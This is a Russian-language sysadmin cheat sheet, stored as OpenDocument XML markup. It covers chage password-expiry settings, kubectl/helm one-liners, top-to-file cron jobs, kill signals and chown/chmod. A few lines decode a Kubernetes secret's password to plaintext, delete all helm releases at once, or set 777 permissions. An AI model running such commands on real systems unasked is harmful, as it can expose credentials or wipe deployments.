      <text:p text:style-name="P1"><text:span text:style-name="T1">&lt;</text:span><text:span text:style-name="T3">strings</text:span><text:span text:style-name="T1">&gt; Задает текст для поиска в файле </text:span><text:span text:style-name="T3">filename</text:span><text:span text:style-name="T1">. Обязательный.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[\&lt;</text:span><text:span text:style-name="T3">drive</text:span><text:span text:style-name="T1">&gt;:][&lt;</text:span><text:span text:style-name="T3">path</text:span><text:span text:style-name="T1">&gt;]&lt;</text:span><text:span text:style-name="T3">filename</text:span><text:span text:style-name="T1">&gt;[...] Указывает расположение и файл или файлы для поиска. Требуется по крайней мере одно имя файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/? Отображает справку в командной строке.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Допустимые мета-символы:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">. Подстановочный знак - любой символ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* Повтор - ноль или более вхождений предыдущего символа или класса.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">^ Начальное расположение строки - начало строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ Конечное расположение строки - конец строки.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">[</text:span><text:span text:style-name="T3">class</text:span><text:span text:style-name="T1">] Класс символов - любой символ в наборе.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">[^</text:span><text:span text:style-name="T3">class</text:span><text:span text:style-name="T1">] Обратный класс - любой символ, не наявляющийся в наборе.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[</text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">y</text:span><text:span text:style-name="T1">] </text:span><text:span text:style-name="T3">Range</text:span><text:span text:style-name="T1"> - все символы в указанном диапазоне.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">\</text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Escape</text:span><text:span text:style-name="T1"> - литеральное использование мета-символа.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">\&lt;</text:span><text:span text:style-name="T3">string</text:span><text:span text:style-name="T1"> Начальное расположение слова - начало слова.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">string</text:span><text:span text:style-name="T1">\&gt; Конечное расположение слова -конец слова.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как заставить пользователя изменить пароль при следующем входе в систему? Существует несколько способов. Использование команды passwd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#sudo passwd --expire [username]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Использование команды chage</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#sudo chage --lastday 0 [username]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Срок действия паролей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#chage -l</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Будет выведена следующая информация:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Когда пароль был последний раз изменен;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Дата окончания действия пароля;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сколько дней осталось до окончания действия пароля;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Когда учетная запись пользователя будет закончена (можно, пожалуйста, далее мы будем говорить «заэкспайрится»?)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Минимальное количество дней между итерацией смены пароля;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Максимальное количество дней между итерацией смены пароля;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Заставляем пользователя менять пароль каждые 90 дней</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#sudo chage -M 90</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Задаем срок жизни учетной записи (до 12 июня 2023)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#sudo chage -E 2023-06-12 serg</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#sudo chage -E 2023-06-12 oleg</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сколько времени на смену пароля? В примере даем Борису 10 дней на смену пароля с момента как пароль заэкспайрился</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#sudo chage -I 10 boris</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Уведомление о смене пароля заранее: Через 25 дней истекает срок годности пароля Бориса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#sudo chage -W 25 boris</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Защищаемся от частой смены паролей пользователя: Минимальное количество дней между сменой паролей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#sudo chage -m 25 boris</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удалить ограничение в днях</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">#sudo chage -m 0 sergey</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Kubernetes: эффективные команды Расшировать параметр секрета: kubectl get secret/db -o yaml | grep DB_PASSWORD | sed 's/.*DB_PASSWORD:\s//' | base64 --decode</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">где db - имя секрета, DB_PASSWORD - один из параметров секрета.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удалить все поды используя helm: helm ls --all --short | xargs -L1 helm delete</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удалить все поды в состоянии Evicted: kubectl get pods | grep Evicted | awk '{print $1}' | xargs kubectl delete pod</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипт для просмотра занятого пространства образами docker:</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/usr/bin/env bash</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">for container in `kubectl get pods --template '{{range .items}}{{.metadata.name}}{{"\n"}}{{end}}'`</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">do</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo -e "$container\t\t $(docker image ls `kubectl get pod $container -o jsonpath='{.spec.containers[0].image}'` --format='{{println .Size}}')"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">done</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипт для для установления соответствия между задеплоеными подами, нодами, где они находятся и зоной в которой располагаются.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/usr/bin/env bash</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">set -euo pipefail</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">PODZONES=()</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">for POD in $(kubectl get pods -o custom-columns=NAME:.metadata.name --no-headers)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>do</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>NODE=$(kubectl get pod ${POD} -o=jsonpath='{.spec.nodeName}')</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>ZONE=$(kubectl get nodes -o json | jq <text:s/>-r --arg NODE "${NODE}" '.items[].metadata | {name, labels} | select(.name==$NODE) | .labels."topology.kubernetes.io/zone"')</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>PODZONES+=(${ZONE})</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>echo -e "${POD}\t${NODE}\t${ZONE}"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">done</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">CPODS=$(kubectl get pods -o custom-columns=NAME:.metadata.name --no-headers | wc -l)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">CNODES=$(kubectl get nodes -o custom-columns=NAME:.metadata.name --no-headers | wc -l)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">CZONES=$(kubectl get nodes -o json | jq <text:s/>-r '.items[].metadata.labels."topology.kubernetes.io/zone"' | sort | uniq -c)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo "----------</text:span><text:span text:style-name="T1">ИТОГО</text:span><text:span text:style-name="T3">:----------"</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo -e "</text:span><text:span text:style-name="T1">Всего</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">подов</text:span><text:span text:style-name="T3">:\t${CPODS}"</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo -e "</text:span><text:span text:style-name="T1">Всего</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">нод</text:span><text:span text:style-name="T3">:\t${CNODES}"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo -e "Количество зон нод:\n${CZONES}"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo "Количество подов в зонах:"</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">printf "%s\n" "${PODZONES[@]}" | sort | uniq -c</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сохраняем вывода команды </text:span><text:span text:style-name="T3">Top</text:span><text:span text:style-name="T1"> в файл. Поскольку я не использовал опцию </text:span><text:span text:style-name="T3">delay</text:span><text:span text:style-name="T1">, приведенная ниже команда </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1"> перенаправит вывод команды </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1"> за одну итерацию в файл.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">top -b -n 1 &gt; /home/i_odmin/backup/output.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сохранение вывода команды </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1">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3">d</text:span><text:span text:style-name="T1">’, как показано ниже:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#top -n 5 -d 4 -b &gt;/backup/output_1.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Как захватить вывод команды </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1">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3">CPU</text:span><text:span text:style-name="T1"> и памяти в системе. Добавляем следующий </text:span><text:span text:style-name="T3">cronjob</text:span><text:span text:style-name="T1">, который будет выполняться с 5 до 6 утра каждые 5 минут в течение часа.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Где:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> : Задает максимальное количество итераций;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">b</text:span><text:span text:style-name="T1"> : Работа в пакетном режиме (Запуск команды </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1"> в пакетном режиме для перенаправления вывода в другие программы или в файл);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1"> : Интервал задержки (Задает задержку между обновлениями экрана).</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#0-59/5 5 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Собраем вывод в один файл, используйте следующий </text:span><text:span text:style-name="T3">cronjob</text:span><text:span text:style-name="T1">. </text:span><text:span text:style-name="T3">Cronjob</text:span><text:span text:style-name="T1"> будет выполняться с 9 до 10 утра каждые 5 минут в течение часа и добавлять результаты в один файл.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#0-59/5 9 * * * top -b -n5 -d 5 &gt;&gt;/home/i_odmin/backup/output.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Записываем вывод команды </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1"> в файл каждые 5 минут в течение получаса. Добавляем следующий </text:span><text:span text:style-name="T3">cronjob</text:span><text:span text:style-name="T1">, который будет запускаться каждые 5 минут с 13:30 до 14:00 в течение получаса.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">#30-59/5 13 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1"> - команда для принудительного завершения исполнения процесса:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Команда </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1">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1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1"> [параметры] идентификатор-процесса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Команда поддерживает ряд параметров командной строки. Наиболее полезным параметром является параметр -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1">, позволяющий указать системный сигнал, который может быть отправлен заданному процессу, а также параметр -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1">, позволяющий вывести список поддерживаемых системных сигналов. Вообще, сигналы могут задаваться в нескольких форматах:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В формате имени сигнала после параметра -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> (-</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">SIGKILL</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В формате номера сигнала после параметра -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> (-</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 5)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В формате номера сигнала (-5)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В формате имени сигнала с префиксом </text:span><text:span text:style-name="T3">SIG</text:span><text:span text:style-name="T1"> (-</text:span><text:span text:style-name="T3">SIGKILL</text:span><text:span text:style-name="T1">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В формате имени сигнала без префикса </text:span><text:span text:style-name="T3">SIG</text:span><text:span text:style-name="T1"> (-</text:span><text:span text:style-name="T3">KILL</text:span><text:span text:style-name="T1">).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">По умолчанию команда осуществляет осуществляет отправку сигнала </text:span><text:span text:style-name="T3">SIGTERM</text:span><text:span text:style-name="T1">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3">kill</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">init</text:span><text:span text:style-name="T1">. Для получения идентификаторов процессов могут использоваться утилиты </text:span><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">top</text:span><text:span text:style-name="T1">.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3">l</text:span><text:span text:style-name="T1"> рассматриваемой утилиты:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ kill -l</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">6) SIGABRT 7) SIGBUS 8 ) SIGFPE 9) SIGKILL 10) SIGUSR1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">31) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">38) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">58) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">63) </text:span><text:span text:style-name="T3">SIGRTMAX</text:span><text:span text:style-name="T1">-1 64) </text:span><text:span text:style-name="T3">SIGRTMAX</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Завершение работы процесса. Для завершения работы процесса достаточно передать его идентификатор команде </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1">. В данном случае в качестве рассматриваемого процесса будет использоваться предварительно запущенный процесс </text:span><text:span text:style-name="T3">ping</text:span><text:span text:style-name="T1"> (в первой вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ping 127.0.0.1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">…</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для получения его идентификатора достаточно использовать команду </text:span><text:span text:style-name="T3">ps</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">aux</text:span><text:span text:style-name="T1">, а также фильтр </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ping</text:span><text:span text:style-name="T1"> (во второй вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ps aux | grep ping</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">…</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">alex 14371 0.0 0.0 18888 1024 pts/0 S+ 21:08 0:00 ping 127.0.0.1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">alex</text:span><text:span text:style-name="T1"> 14381 0.0 0.0 17628 908 </text:span><text:span text:style-name="T3">pts</text:span><text:span text:style-name="T1">/1 </text:span><text:span text:style-name="T3">S</text:span><text:span text:style-name="T1">+ 21:08 0:00 </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ping</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Процесс имеет идентификатор 14371. Для его завершения достаточно использовать команду </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1"> (также во второй вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1"> 14371</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В результате исполнение процесса будет остановлено (в первой вкладке эмулятора терминала):</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ping 127.0.0.1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">…</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">64 bytes from 127.0.0.1: icmp_seq=37 ttl=64 time=0.052 ms</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Завершено</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Завершение работы зависшего процесса. В случае зависшего процесса или процесса, игнорирующего сигнал </text:span><text:span text:style-name="T3">SIGTERM</text:span><text:span text:style-name="T1">, следует использовать сигнал </text:span><text:span text:style-name="T3">SIGKILL</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Для этого следует преобразовать недавно рассмотренную команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1"> 14371</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ </text:span><text:span text:style-name="T3">kill</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">SIGKILL</text:span><text:span text:style-name="T1"> 14371</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Исполнение процесса должно завершиться в любом случае.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Работа с правами доступа файлов и директорий в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Назначить пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> владельцем файла </text:span><text:span text:style-name="T3">file</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">R</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Рекурсивно обойти директорию </text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> и назначить пользователя </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1"> владельцем всех вложенных файлов и директорий</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chown</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">vasya</text:span><text:span text:style-name="T1">:</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Назначить владельца и группу для файла /</text:span><text:span text:style-name="T3">file</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ugo</text:span><text:span text:style-name="T1">+</text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Установить полные права доступа </text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">Read</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Write</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">eXecute</text:span><text:span text:style-name="T1"> ) для всех </text:span><text:span text:style-name="T3">ugo</text:span><text:span text:style-name="T1"> ( </text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Other</text:span><text:span text:style-name="T1"> ) на директорию /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1">. То-же самое можно сделать, используя числовой представление </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> 777 </text:span><text:span text:style-name="T3">directory</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chmod</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">go</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">rwx</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> - Удалить все права на директорию /</text:span><text:span text:style-name="T3">directory</text:span><text:span text:style-name="T1"> для группы и остальных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">chgrp</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> - Изменить группу-владельца для </text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1"> на </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">group</text:span></text:p>
